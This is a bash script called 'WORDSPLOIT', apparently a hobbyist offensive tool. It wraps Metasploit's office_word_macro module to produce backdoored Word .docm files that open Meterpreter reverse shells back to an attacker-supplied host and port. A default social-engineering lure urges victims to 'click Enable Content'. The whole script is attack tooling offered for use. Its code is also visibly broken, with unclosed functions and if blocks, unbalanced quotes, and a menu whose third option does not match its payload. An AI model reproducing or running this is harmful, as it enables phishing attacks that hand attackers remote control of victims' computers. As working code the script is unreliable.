#!/bin/bash
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
BlueF='\e[1;34m' #Biru
RESET="\033[00m" #normal

# spinner for Metasploit Generator
spinlong ()
{
    bar=" +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ "
    barlength=${#bar}
    i=0
    while ((i < 100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.02
    done
}
#for checking if your command is correct
gboor ()
{
cat << !
  Generate Backdoor
  +------------++-------------------------++-----------------------+
  | Name       ||  Descript               || Your Input
  +------------++-------------------------++-----------------------+
  | LHOST      ||  The Listen Addres      || $yourip
  | LPORT      ||  The Listen Ports       || $yourport
  | OUTPUTNAME ||  The Filename output    || $fira
  +------------++-------------------------++-----------------------+


!
}

clear
echo 
echo -e $white"INSTALLING REQUIRED TOOLS!!!"
apt-get install figlet

f_un_ban (){

clear
figlet ...WORDSPLOIT...
echo -e $okegreen" ........Made By GetRektBoy724........"
echo -e $okegreen"-------------------------------------------"

}

f_un_show () {
echo -e $red"Exploiting Office Word with MACRO!!!"
echo -e $red"IF YOU DONT HAVE METASPLOIT-FRAMEWORK......PLEASE EXIT!!!!!"
echo -e $red"Choose Your Payload,Please!!!"
echo "-----------------------------------------------"
echo -e $red"1.windows/meterpreter/reverse_tcp"
echo -e $okegreen"2.windows/meterpreter/reverse_https"
echo -e $white"3.windows/meterpreter/reverse_http"
echo -e $BlueF"4.Exit The Program"

}

f_op_1 () {
echo -ne "   SET LHOST : ";tput sgr0
read yourip
echo ""
echo -ne $okegreen "  SET LPORT : ";tput sgr0
read yourport
echo ""
echo -ne $okegreen "  Enter the base name for output files : " ;tput sg0
read fira
echo ""
#setup body
echo -ne $okegreen "  Enter the message for the document body ENTER = default : " ;tput sgr0
read bodys
#echo $bodys
if [[ "$bodys" == "" ]]; then
bodys="Contents of this document are protected. Please click Enable Content to continue."
#echo $bodys
#setupexe
echo""
echo -ne $okegreen "  Are u want Use custom exe file backdoor  y/n :" ;tput sgr0
read exe
if [ $exe != 'y' ] && [ $exe != 'Y' ]
then
spinlong
echo ""
echo ""
gboor
spinlong
echo ""
msfconsole -x 'use exploit/multi/fileformat/office_word_macro; set payload windows/meterpreter/reverse_tcp ; set FILENAME $fira.docm;set BODY $bodys; set lhost $yourip ; set lport $yourport; exploit; exit -y'"
echo ""
mv ~/.msf4/local/$fira.docm $path/output/$fira.docm 
echo -e $okegreen""
echo -e $yellow"  Backdoor doc Saved To output Folder "
echo ""
echo -e $okegreen"  Press any key to continue ......... "
read aw
mainmenu

}

f_op_4 () {
clear
echo -e $BlueF"GoodBye Everyone.....Happy Hacking"

}

f_op_2 () {

echo -ne "   SET LHOST PLEASE USE PUBLIC IP!! : ";tput sgr0
read yourip
echo ""
echo -ne $okegreen "  SET LPORT : ";tput sgr0
read yourport
echo ""
echo -ne $okegreen "  Enter the base name for output files : " ;tput sg0
read fira
echo ""
#setup body
echo -ne $okegreen "  Enter the message for the document body ENTER = default : " ;tput sgr0
read bodys
#echo $bodys
if [[ "$bodys" == "" ]]; then
bodys="Contents of this document are protected. Please click Enable Content to continue."
#echo $bodys
#setupexe
echo""
echo -ne $okegreen "  Are u want Use custom exe file backdoor  y/n :" ;tput sgr0
read exe
if [ $exe != 'y' ] && [ $exe != 'Y' ]
then
spinlong
echo ""
echo ""
gboor
spinlong
echo ""
msfconsole -x 'use exploit/multi/fileformat/office_word_macro; set payload windows/meterpreter/reverse_https ; set FILENAME $fira.docm ;set BODY $bodys; set lhost $yourip ; set lport $yourport; exploit; exit -y'"
echo ""
mv ~/.msf4/local/$fira.docm $path/output/$fira.docm 
echo -e $okegreen""
echo -e $yellow"  Backdoor doc Saved To output Folder "
echo ""
echo -e $okegreen"  Press any key to continue ......... "
read aw
mainmenu



f_op_3 () {

echo -ne "   SET LHOST PLEASE USE PUBLIC IP!! : ";tput sgr0
read yourip
echo ""
echo -ne $okegreen "  SET LPORT : ";tput sgr0
read yourport
echo ""
echo -ne $okegreen "  Enter the base name for output files : " ;tput sg0
read fira
echo ""
#setup body
echo -ne $okegreen "  Enter the message for the document body ENTER = default : " ;tput sgr0
read bodys
#echo $bodys
if [[ "$bodys" == "" ]]; then
bodys="Contents of this document are protected. Please click Enable Content to continue."
#echo $bodys
#setupexe
echo""
echo -ne $okegreen "  Are u want Use custom exe file backdoor  y/n :" ;tput sgr0
read exe
if [ $exe != 'y' ] && [ $exe != 'Y' ]
then
spinlong
echo ""
echo ""
gboor
spinlong
echo ""
msfconsole -x 'use exploit/multi/fileformat/office_word_macro; set payload windows/meterpreter/reverse_https ; set FILENAME $fira.docm ;set BODY $bodys; set lhost $yourip ; set lport $yourport; exploit; exit -y'"
echo ""
mv ~/.msf4/local/$fira.docm $path/output/$fira.docm 
echo -e $okegreen""
echo -e $yellow"  Backdoor doc Saved To output Folder "
echo "Press Any Key To Continue""
read aw
mainmenu


mainmenu () {
        clear
        f_un_ban && f_un_show
        read mainchoice
        echo
        case $mainchoice in 
        1) f_op_1 ;;
        2) f_op_2 ;;
        3) f_op_3 ;;
        4) f_op_4 ;;
        6|Q|q|exit|quit) exit ;;
        *) mainmenu ;;
        esac

}

clear
mainmenu
exit [n]
